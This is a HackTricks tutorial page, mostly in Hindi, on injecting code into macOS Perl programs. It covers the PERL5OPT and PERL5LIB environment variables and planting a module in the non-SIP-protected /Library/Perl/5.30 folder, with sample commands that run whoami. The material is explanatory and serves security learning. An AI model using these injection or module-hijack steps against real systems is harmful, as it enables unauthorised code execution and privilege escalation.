# macOS Perl Applications Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## `PERL5OPT` और `PERL5LIB` एन्वायरनमेंट वेरिएबल के माध्यम से

एन्वायरनमेंट वेरिएबल PERL5OPT का उपयोग करके, यह संभव है कि पर्ल मनमाने कमांड को निष्पादित करे।\
उदाहरण के लिए, यह स्क्रिप्ट बनाएं:

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

अब **env वेरिएबल को एक्सपोर्ट करें** और **perl** स्क्रिप्ट को निष्पादित करें:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
एक और विकल्प एक Perl मॉड्यूल बनाना है (जैसे कि `/tmp/pmod.pm`):

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

और फिर env वेरिएबल्स का उपयोग करें:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Via dependencies

यह संभव है कि Perl चलाने के निर्भरता फ़ोल्डर क्रम को सूचीबद्ध किया जा सके:
```bash
perl -e 'print join("\n", @INC)'
```
जो कुछ इस तरह लौटाएगा:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
कुछ लौटाए गए फ़ोल्डर वास्तव में मौजूद नहीं हैं, हालाँकि, **`/Library/Perl/5.30`** **मौजूद** है, यह **SIP** द्वारा **सुरक्षित** **नहीं** है और यह **SIP** द्वारा **सुरक्षित** फ़ोल्डरों से **पहले** है। इसलिए, कोई उस फ़ोल्डर का दुरुपयोग कर सकता है ताकि वहाँ स्क्रिप्ट निर्भरताएँ जोड़ी जा सकें ताकि एक उच्च विशेषाधिकार प्राप्त Perl स्क्रिप्ट इसे लोड कर सके।

{% hint style="warning" %}
हालाँकि, ध्यान दें कि आपको उस फ़ोल्डर में लिखने के लिए **रूट** होना **ज़रूरी** है और आजकल आपको यह **TCC प्रॉम्प्ट** मिलेगा:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

उदाहरण के लिए, यदि एक स्क्रिप्ट **`use File::Basename;`** आयात कर रही है, तो यह संभव होगा कि `/Library/Perl/5.30/File/Basename.pm` बनाया जाए ताकि यह मनमाना कोड निष्पादित कर सके।

## संदर्भ

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* **💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **Twitter** 🐦 पर हमें **फॉलो** करें [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **हैकिंग ट्रिक्स साझा करें और [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपॉजिटरी में PR सबमिट करें।**

</details>
{% endhint %}
